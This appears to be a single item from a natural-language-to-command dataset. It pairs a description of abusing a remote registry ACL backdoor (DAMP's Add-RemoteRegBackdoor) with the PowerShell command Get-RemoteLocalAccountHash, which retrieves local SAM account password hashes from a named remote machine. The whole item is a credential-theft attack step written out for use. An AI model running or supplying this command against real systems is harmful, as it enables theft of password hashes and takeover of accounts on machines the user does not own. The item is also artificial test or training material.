# Natural language intent:
# using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.

Get-RemoteLocalAccountHash -ComputerName < remotehost> -Verbose
